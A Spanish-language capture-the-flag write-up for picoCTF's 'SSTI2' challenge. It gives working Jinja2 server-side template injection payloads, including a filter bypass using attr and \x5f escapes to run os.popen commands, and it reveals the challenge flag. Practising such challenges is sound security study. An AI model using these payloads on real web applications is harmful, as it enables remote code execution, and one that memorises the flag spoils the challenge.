
## Reto
### SSTI2

## Descripcion
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

## Solucion
- Parece ser la misma pagina que en SSTI1
- dice ser que ya esta sanitizado entonces probremos primero con {{7 * 7}}
- nos da 49 entonces sigue siendo jinja2 y podemos usar inyecciones
- pero hay cadenas de caracteres prohibidas, si intentamos el mismo comando que en SSTI1:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```
- nos va a devolver el siguiente tecto
```
# Stop trying to break me >:(
```
- Jugando un poco descubri que `{{_}}` es una de las cadenas que prohibe y creo que usar puntos tambien esta prohibido
- entonces tenemos que usar diferentes notaciones para el servidor lo interprete como `_`
- uno de estos sera `\x5` que es igual a `_`
- despues de curar todo nos queda algo asi:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```
- cuando lo ponemos en la pagina vemos que efectivamente sobrepasamos su "filtro de seguridad" y podemos ver flag.txt
- finalmente cambiamos el `ls` de la ultima parte del comando por `cat flag.txt` y obtenemos la bandera: **# picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}**

## Notas
- aunque entiendo la logica de lo que acabamod de hacer, no entiendo nada de jinja2


## Referencias
[SSTI2 (PicoCTF) - tobias are - Medium](https://medium.com/@vgqxjb/ssti2-picoctf-4caa7ac497c5)
[SSTI2 Write-up PicoCTF 2025 - mihasha - Medium](https://medium.com/@mihasha/ssti2-write-up-picoctf-2025-5fc53e2320ba)